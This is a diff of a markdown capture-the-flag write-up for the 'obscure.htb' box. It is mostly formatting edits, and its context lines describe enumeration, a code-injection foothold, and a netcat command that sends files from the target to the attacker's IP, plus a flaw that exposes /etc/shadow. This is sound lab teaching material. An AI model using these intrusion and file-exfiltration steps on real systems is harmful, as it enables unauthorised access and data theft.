@@ -91,7 +91,7 @@ The web service page source code reveals the following.
 <img src="source-code.png"><br>
 
 ### Enumeration
-This provides a unique point for pivoting. `SuperSecureServer.py` must exist somewhere. We can use Wfuzz to enumerate possibilities.
+This provides a unique point for pivoting. `SuperSecureServer.py` must exist somewhere. We can use Wfuzz to enumerate possibilities.<br>
 `wfuzz -w /usr/share/wordlists/dirb/big.txt --hc 404 http://obscure.htb:8080/FUZZ/SuperSecureServer.py`
 ```
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -115,8 +115,8 @@ Filtered Requests: 20468
 Requests/sec.: 226.6855
 ```
 
-Now pull the file down for further analysis.
-`wget http://obscure.htb:8080/develop/SuperSecureServer.py`
+Now pull the file down for further analysis.<br>
+`wget http://obscure.htb:8080/develop/SuperSecureServer.py`<br>
 The flaw in their code is seen here. The info variable line and exec function is the hole we need to inject a reverse shell.
 ```python
     def serveDoc(self, path, docRoot):
@@ -151,7 +151,7 @@ This reverse shell payload can be executed against the SuperSecureServer.py serv
 And now we have a foothold on the account running SuperSecureServer.py as a service. Now the real fun begins.
 
 ### More enumeration!
-I like to start by identifying the processes running under my foothold account (www-data in this scenario).
+I like to start by identifying the processes running under my foothold account (www-data in this scenario).<br>
 `www-data@obscure:/$ ps aux | grep www-data`
 ```
 www-data   1478  0.0  0.1  20048  3552 tty1     Ss   22:58   0:00 /bin/bash /var/SuperSecureServer/init.sh
@@ -162,8 +162,8 @@ www-data   2272  0.0  0.0  13136  1072 tty1     S+   23:54   0:00 grep www-data
 
 ```
 
-/var/SuperSecureServer/ is an interesting path. Maybe we can read the directory.
-`www-data@obscure:/$ ls -lh /var/SuperSecureServer`
+/var/SuperSecureServer/ is an interesting path. Maybe we can read the directory.<br>
+`www-data@obscure:/$ ls -lh /var/SuperSecureServer`<br>
 yes, we can! robert is listed as an owner of these files.
 ```
 total 28K
@@ -174,7 +174,7 @@ drwxr-xr-x 8 robert robert 4.0K Oct  5  2019 DocRoot
 drwxr-xr-x 2 robert robert 4.0K Nov 26  2019 __pycache__
 -rw-r--r-- 1 root   root   5.8K Nov 26  2019 SuperSecureServer.py
 ```
-Let's see if we can read other directories and files that robert owns.
+Let's see if we can read other directories and files that robert owns.<br>
 `www-data@obscure:/$ find / -user robert 2> /dev/null | grep -Ev '^(/proc/|/var/SuperSecureServer/)'`
 ```
 /var/SuperSecureServer
@@ -195,7 +195,7 @@ Let's see if we can read other directories and files that robert owns.
 /home/robert/.config
 ```
 
-Well well wellllllll. Looks like robert got sloppy with his home directory's file permissions.
+Well well wellllllll. Looks like robert got sloppy with his home directory's file permissions.<br>
 `www-data@obscure:/home/robert$ ls -alh`
 ```
 total 60K
@@ -234,33 +234,6 @@ total 4.0K
 -rwxr-xr-x 1 root root 1.8K Oct  5  2019 BetterSSH.py
 ```
 On our kali machine, we can open a socket to accept any interesting files.
-`kali@kali:~$ nc -nlvp 9000 > BetterSSH_copy.`
-```
-Ncat: Version 7.80 ( https://nmap.org/ncat )
-Ncat: Listening on :::9000
-Ncat: Listening on 0.0.0.0:9000
-```
-
-Back to our pal robert....
-```
-www-data@obscure:/home/robert$ cd BetterSSH
-www-data@obscure:/home/robert/BetterSSH$ nc 10.10.14.36 9000 < BetterSSH.py
-
-www-data@obscure:/home/robert/BetterSSH$ md5sum BetterSSH.py
-91f9b055de93ea34b0d789dd4d57c523  BetterSSH.py
-```
-
-It's always good to verify file integrity just in case something was lost or corrupted during transfer.
-On our Kali workstation, break out of our netcat session and verify the md5sum matches.
-```
-Ncat: Connection from 10.10.10.168.
-Ncat: Connection from 10.10.10.168:39768.
-^C
-kali@kali:~$ md5sum BetterSSH_copy.py
-91f9b055de93ea34b0d789dd4d57c523  BetterSSH_copy.py
-```
-
-And there's on more file of interest....
 ```
 www-data@obscure:/home/robert$ nc 10.10.14.36 9000 < SuperSecureCrypt.py
 www-data@obscure:/home/robert$ md5sum SuperSecureCrypt.py
@@ -296,9 +269,8 @@ www-data@obscure:/home/robert$ md5sum check.txt
 efeb69264c227272d9d3efcf8f58ed9f  check.txt
 ```
 
-Do yourself a favor and set the `out.txt` copy on your kali workstation to read-only. You don't want to accidentally overwrite our comparison measurement with invalid data. That would be frustrating to say the least.
-
-`kali@kali:~/htb/boxes/obscure$ chmod 400 out.txt`
+Do yourself a favor and set the `out.txt` copy on your kali workstation to read-only. You don't want to accidentally overwrite our comparison measurement with invalid data. That would be frustrating to say the least.<br>
+`kali@kali:~/htb/boxes/obscure$ chmod 400 out.txt`<br>
 
 Here is a copy of the original code.
 ```python
@@ -547,7 +519,7 @@ Checking for sudo privileges...<br>
 
 Jackpot! And doesn't that look familiar? We should inspect this code further for any flaws. They were smart enough to properly set file permissions, so modifying the file is not an option. :( It's too bad really; that would've made this even easier. Surely there must be another way...
 
-And here's the flaw. They can read `/etc/shadow` since the file executes as root, bu they do not properly set the file permission after writing shadow's contents into a the `/tmp/` directory.
+And here's the flaw. They can read `/etc/shadow` since the file executes as root, but they do not properly set the file permission after writing shadow's contents into a the `/tmp/` directory.
 ```python
 with open('/etc/shadow', 'r') as f:
     data = f.readlines()
